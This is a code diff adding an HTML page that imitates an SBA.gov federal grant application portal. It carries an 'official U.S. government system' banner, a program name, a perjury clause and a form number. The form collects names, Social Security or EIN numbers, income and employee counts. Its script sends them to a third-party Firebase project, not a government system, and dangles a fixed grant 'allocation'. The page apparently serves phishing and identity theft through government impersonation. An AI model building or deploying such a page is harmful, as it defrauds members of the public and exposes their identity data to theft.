@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | 2026 Grant Application</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body style="background: #f1f5f9;">
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
+    </div>
+
+    <div class="nav" style="display: flex; justify-content: space-between; align-items: center; padding: 14px 16px; background: #1e3a8a;">
+        <h1 style="margin: 0; font-size: 16px; letter-spacing: 2px; color: white;">SBA.GOV</h1>
+        <button onclick="location.href='dashboard.html'" style="width: auto !important; padding: 6px 15px; background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); border-radius: 6px; color: white; font-size: 11px; font-weight: 700; cursor: pointer;">
+            CANCEL
+        </button>
+    </div>
+
+    <div class="container">
+        <div class="card" style="margin-top: 15px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1); border-top: 5px solid #1e3a8a;">
+            <h2 style="color: #1e3a8a; font-size: 20px; margin-bottom: 5px;">Grant Application Form</h2>
+            <p style="font-size:11px; color:#64748b; margin-bottom:20px;">
+                FY2026 Economic Injury Disaster Relief (EIDR) Program. 
+                <br><b>Application ID:</b> <span id="appId" style="font-family: monospace; color: #1e3a8a; font-weight: bold;"></span>
+            </p>
+            
+            <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Full Legal Name / Entity Name</label>
+            <input type="text" id="bizName" placeholder="As it appears on SSN/EIN Card" style="width:100%; padding:12px; border-radius:8px; border:1px solid #cbd5e1; margin-bottom:15px; box-sizing:border-box;">
+
+            <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Tax Identification Number (SSN/EIN)</label>
+            <input type="text" id="taxId" placeholder="000-00-0000" style="width:100%; padding:12px; border-radius:8px; border:1px solid #cbd5e1; margin-bottom:15px; box-sizing:border-box;">
+
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom:15px;">
+                <div>
+                    <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">2025 Gross Income</label>
+                    <input type="number" id="revenue" placeholder="$ USD" style="width:100%; padding:12px; border-radius:8px; border:1px solid #cbd5e1; box-sizing:border-box;">
+                </div>
+                <div>
+                    <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Employees</label>
+                    <input type="number" id="employees" placeholder="0" style="width:100%; padding:12px; border-radius:8px; border:1px solid #cbd5e1; box-sizing:border-box;">
+                </div>
+            </div>
+
+            <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Requested Allocation (Fixed)</label>
+            <input type="text" id="reqAmt" readonly style="width:100%; padding:12px; border-radius:8px; border:1px solid #cbd5e1; background: #f1f5f9; font-weight: 800; color: #1e3a8a; margin-bottom:15px; box-sizing:border-box;">
+
+            <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Operational Use of Funds</label>
+            <textarea id="reason" style="width:100%; height:70px; font-family: inherit; font-size: 13px; padding:10px; border-radius: 8px; border: 1px solid #cbd5e1; margin-bottom:15px; resize: none; box-sizing:border-box;" placeholder="Describe how these funds will support your economic recovery..."></textarea>
+
+            <div style="background: #f8fafc; padding: 12px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #e2e8f0; display: flex; gap: 10px;">
+                <input type="checkbox" id="legalCheck" style="width: 20px; height: 20px; margin-top: 3px; cursor:pointer;">
+                <p style="font-size: 10px; color: #475569; line-height: 1.4; margin: 0;">
+                    I certify under penalty of perjury (18 U.S.C. § 1001) that the information provided is true and accurate to the best of my knowledge.
+                </p>
+            </div>
+
+            <button id="submitAppBtn" style="background: #1e3a8a; color:white; font-weight: 800; width:100%; padding:16px; border:none; border-radius:8px; cursor:pointer; text-transform:uppercase; letter-spacing: 1px;">SUBMIT FEDERAL APPLICATION</button>
+        </div>
+        
+        <p style="text-align: center; font-size: 10px; color: #94a3b8; margin-top: 20px; padding-bottom: 30px;">
+            SBA Form 3501-A | OMB Control No. 3245-0406
+        </p>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+        import { getAuth, onAuthStateChanged, reload } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getFirestore, collection, addDoc, doc, onSnapshot, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
+            authDomain: "sba-grant-2026.firebaseapp.com",
+            projectId: "sba-grant-2026",
+            storageBucket: "sba-grant-2026.firebasestorage.app",
+            messagingSenderId: "838430821326",
+            appId: "1:838430821326:web:6438deacb334076a64f99f"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+        
+        // Generate a random Application ID for UI purposes
+        document.getElementById('appId').innerText = "SBA-2026-" + Math.floor(100000 + Math.random() * 900000);
+
+        // Security Check & Pulling Current Balance
+        onAuthStateChanged(auth, async (user) => {
+            if (user) {
+                await reload(user);
+                if (!user.emailVerified) {
+                    window.location.href = 'verify.html';
+                    return;
+                }
+
+                // Get the balance assigned to this user from the 'users' collection
+                onSnapshot(doc(db, "users", user.uid), (snap) => {
+                    if(snap.exists()) {
+                        document.getElementById('reqAmt').value = `$${snap.data().balance}`;
+                    }
+                });
+            } else {
+                window.location.href = 'index.html';
+            }
+        });
+
+        const btn = document.getElementById('submitAppBtn');
+        btn.addEventListener('click', async () => {
+            const user = auth.currentUser;
+            const check = document.getElementById('legalCheck').checked;
+            const name = document.getElementById('bizName').value.trim();
+            const tax = document.getElementById('taxId').value.trim();
+            const amount = document.getElementById('reqAmt').value;
+            const revenue = document.getElementById('revenue').value;
+            const employees = document.getElementById('employees').value;
+
+            if(!check || !name || !tax) return alert("Please fill all required legal fields and certify the information.");
+
+            btn.innerText = "Transmitting to SBA Servers...";
+            btn.disabled = true;
+
+            try {
+                // 1. Log the application request in the 'requests' collection
+                await addDoc(collection(db, "requests"), {
+                    userId: user.uid,
+                    userName: name,
+                    userEmail: user.email,
+                    taxId: tax,
+                    revenue: revenue,
+                    employees: employees,
+                    amount: amount,
+                    type: "GRANT_APPLICATION",
+                    status: "PENDING",
+                    timestamp: serverTimestamp()
+                });
+
+                // 2. Update the user's status to reflect the submission
+                await updateDoc(doc(doc(db, "users", user.uid)), { 
+                    status: "UNDER REVIEW",
+                    appliedDate: new Date().toLocaleDateString('en-US', { month: 'long', year: 'numeric' })
+                });
+
+                alert("APPLICATION TRANSMITTED: Your file has been queued for FY2026 review.");
+                window.location.href = 'dashboard.html';
+                
+            } catch(e) { 
+                console.error(e);
+                alert("TRANSMISSION ERROR: Secure link interrupted. Please try again."); 
+                btn.disabled = false;
+                btn.innerText = "SUBMIT FEDERAL APPLICATION";
+            }
+        });
+    </script>
+</body>
+</html>
